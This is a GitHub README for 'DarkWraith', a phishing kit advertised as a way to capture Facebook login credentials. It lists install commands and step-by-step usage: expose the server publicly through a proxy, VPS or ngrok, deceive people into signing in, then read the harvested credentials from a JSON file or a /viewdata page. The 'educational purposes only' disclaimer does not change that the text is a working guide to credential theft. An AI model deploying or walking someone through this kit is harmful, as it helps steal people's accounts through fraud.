# DarkWraith
## Easily Capture Facebook Login Credentials
#### Built with: 
<p>Node.js, Express.js, React.js, Vite.js</p>

![Example](https://i.imgur.com/hF3pSAQ.jpeg)

### INSTALLATION

#### Requirements
<ul>
  <li>Node.js</li>
  <li>Node Package Manager (npm)</li>
</ul>

#### *LINUX/WINDOWS/MACOS*
<p>1. Open a new terminal window and enter the following commands:</p>
```
git clone https://github.com/G0dKing/darkwraith.git
cd darkwraith
cd client && npm i && npm run build
cd .. && npm i && npm run start
```
<p>2. Navigate to "http://localhost:3001" in any browser to view the application.</p>

### USAGE
<p>1. Deploy the Express.js server to the public internet. This can be done in one of several ways, including:</p>
<ul>
  <li>via SSL-encrypted reverse-proxy (using NGINX or Apache2)</li>
  <li>via a cloud VPS provider (such as AWS. Heroku, Digital Ocean, Linode, etc.</li>
  <li>via a tunneling service (such as NGROK)</li>
</ul>
<p>2. Use social-engineering or additional methods of obfuscation or deception until someone attempts to sign-in using their Facebook credentials.</p>
<p>3. Credentials are saved to "/data/capture.json", and can be viewed at either the "/viewdata" API endpoint as raw json or by loading "[your-domain-name]/viewdata.html".</p>

<p>TODO: Include download links to the above resources and create deployment guides for each.</p>

### DISCLAIMER
#### *FOR EDUCATIONAL PURPOSES ONLY*
<p>The files contained in this repository serve as proof-of-concept for an alternative method of phishing Facebook users' login credentials. Under no circumstances is to be used for this purpose, or any other purposes beyond an informative and educational scope.In using, copying, modifying, or otherwise engaging with this project, the user accepts full responsibility for their use of this software. The owner of this repository is not responsible for misuse of this software, and neither condones nor supports unlawful activity of any kind.</p> 

### LICENSE
This software is licensed under the GNU Public License v. 3. It is, and will forever be, Free and Open Source Software (FOSS) that can be freely used, modfiied, and distributed, with or without crediting the creator. 
